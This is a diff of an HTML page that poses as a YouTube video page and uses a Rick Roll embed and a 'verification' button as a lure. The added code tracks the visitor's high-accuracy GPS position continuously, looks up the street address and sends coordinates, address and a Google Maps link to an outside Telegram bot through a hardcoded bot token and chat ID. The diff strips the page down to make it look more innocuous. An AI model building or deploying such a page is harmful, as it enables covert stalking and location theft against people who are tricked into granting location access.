@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video & Live Tracker</title>
+    <title>Video Youtube</title>
     <style>
         body { font-family: Arial; padding: 20px; background: #f0f0f0; }
         #video-container { text-align: center; margin-bottom: 20px; }
@@ -11,81 +11,121 @@
         #output { background: #e9ecef; padding: 15px; border-radius: 5px; white-space: pre-wrap; margin-top: 10px; }
         button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
         button:hover { background: #0056b3; }
+        a { color: #007bff; text-decoration: none; font-weight: bold; }
+        a:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
     <h1>Nonton Video Ini Dulu!</h1>
-    <p>Klik tombol di bawah buat verif dan track promo spesial. Share lokasi lo ya!</p>
+    <p>klik!</p>
     
     <div id="video-container">
-        <!-- Ganti VIDEO_ID dengan ID YouTube lo, misal dQw4w9WgXcQ untuk Rick Roll -->
         <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?rel=0" allowfullscreen></iframe>
     </div>
     
-    <button onclick="startTrack()">Mulai Verif & Track</button>
+    <button onclick="startTrack()">Mulai Verif & Track Akurat</button>
     <button onclick="stopTrack()">Stop</button>
-    <div id="output">Klik Mulai buat mulai tracking dan kirim data...</div>
+    <div id="output">Klik Mulai buat mulai tracking akurat...</div>
 
     <script>
-        // Ganti ini dengan data bot lo
-        const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE'; // Dari BotFather
-        const CHAT_ID = '7680606818'; // ID chat lo
+        // Ganti ini
+        const BOT_TOKEN = '7822471568:AAE89BHf7mxBx4kqhKNLyE7yP4IlMgi8wFE';
+        const CHAT_ID = '7680606818';
         
         let watchId;
+        let lastLat = null;
+        let lastLng = null;
+        const MIN_DISTANCE = 5; // Meter, biar nggak spam kirim
         const output = document.getElementById('output');
 
-        // Fungsi kirim pesan ke Telegram (lat, lng, accuracy, timestamp)
-        async function sendToTelegram(lat, lng, accuracy, timestamp) {
-            const message = `Lokasi Baru!\nLatitude: ${lat}\nLongitude: ${lng}\nAkurasi: ${accuracy}m\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        // Hitung jarak sederhana (Haversine approx)
+        function getDistance(lat1, lng1, lat2, lng2) {
+            if (!lat1 || !lat2) return Infinity;
+            const R = 6371e3; // Radius bumi meter
+            const φ1 = lat1 * Math.PI/180;
+            const φ2 = lat2 * Math.PI/180;
+            const Δφ = (lat2-lat1) * Math.PI/180;
+            const Δλ = (lng2-lng1) * Math.PI/180;
+            const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        // Reverse geocode buat alamat approx (Nominatim free API)
+        async function getAddress(lat, lng) {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                const data = await res.json();
+                return data.display_name || 'Alamat tidak ditemukan';
+            } catch (e) {
+                return 'Error geocode';
+            }
+        }
+
+        // Kirim ke Telegram dengan link Maps + alamat
+        async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
+            const message = `Lokasi Akurat Baru!\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\nMaps: ${mapsLink}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
             
             try {
                 const response = await fetch(url);
                 if (response.ok) {
-                    console.log('Data lokasi terkirim ke Telegram!');
-                    output.innerHTML += `\n--- Dikirim ke bot: ${message}`;
+                    console.log('Data akurat terkirim!');
+                    output.innerHTML += `\n--- Dikirim ke bot (dengan link Maps)!`;
                 } else {
-                    console.error('Gagal kirim ke Telegram:', response.status);
-                    output.innerHTML += `\n--- Error kirim ke bot: ${response.status}`;
+                    output.innerHTML += `\n--- Error kirim: ${response.status}`;
                 }
             } catch (error) {
-                console.error('Error fetch:', error);
                 output.innerHTML += `\n--- Error: ${error.message}`;
             }
         }
 
         function startTrack() {
             if (navigator.geolocation) {
-                output.innerHTML = 'Mulai tracking... Tunggu permission.';
+                output.innerHTML = 'Mulai tracking akurat... Tunggu permission (GPS on ya!).';
                 watchId = navigator.geolocation.watchPosition(showPosition, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0 // Update fresh terus
+                    enableHighAccuracy: true, // Ini kunci buat akurasi tinggi
+                    timeout: 10000,
+                    maximumAge: 1000 // Cache max 1 detik
                 });
             } else {
-                output.innerHTML = 'Geolocation nggak support di browser ini.';
+                output.innerHTML = 'Geolocation nggak support.';
             }
         }
 
-        function showPosition(position) {
+        async function showPosition(position) {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             const acc = position.coords.accuracy;
             const time = position.timestamp;
             
-            // Tampil di halaman
-            output.innerHTML = `Lat: ${lat.toFixed(6)}\nLng: ${lng.toFixed(6)}\nAccuracy: ${acc.toFixed(0)}m\nTime: ${new Date(time).toLocaleString('id-ID')}\n--- Update terbaru ---`;
+            // Cek jarak dari posisi terakhir
+            const distance = getDistance(lastLat, lastLng, lat, lng);
+            if (distance < MIN_DISTANCE && lastLat !== null) {
+                return; // Skip kalo geraknya kecil
+            }
+            lastLat = lat;
+            lastLng = lng;
             
-            // Otomatis kirim ke Telegram
-            sendToTelegram(lat, lng, acc, time);
+            // Buat link Maps akurat kayak contoh lo
+            const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
+            
+            // Geocode alamat
+            const address = await getAddress(lat, lng);
+            
+            // Tampil di halaman
+            output.innerHTML = `Lat: ${lat.toFixed(7)}\nLng: ${lng.toFixed(7)}\nAkurasi: ${acc.toFixed(0)}m\nAlamat: ${address}\nWaktu: ${new Date(time).toLocaleString('id-ID')}\nLink Maps: <a href="${mapsLink}" target="_blank">${mapsLink}</a>\n--- Update akurat ---`;
+            
+            // Kirim ke Telegram
+            sendToTelegram(lat, lng, acc, time, address, mapsLink);
         }
 
         function showError(error) {
             let msg = 'Error: ';
             switch(error.code) {
-                case error.PERMISSION_DENIED: msg += 'Permission ditolak.'; break;
-                case error.POSITION_UNAVAILABLE: msg += 'Lokasi nggak tersedia.'; break;
-                case error.TIMEOUT: msg += 'Timeout.'; break;
+                case error.PERMISSION_DENIED: msg += 'Permission ditolak. Izinin GPS ya!'; break;
+                case error.POSITION_UNAVAILABLE: msg += 'Lokasi nggak tersedia. Coba outdoor.'; break;
+                case error.TIMEOUT: msg += 'Timeout. Sinyal lemah.'; break;
             }
             output.innerHTML = msg;
         }
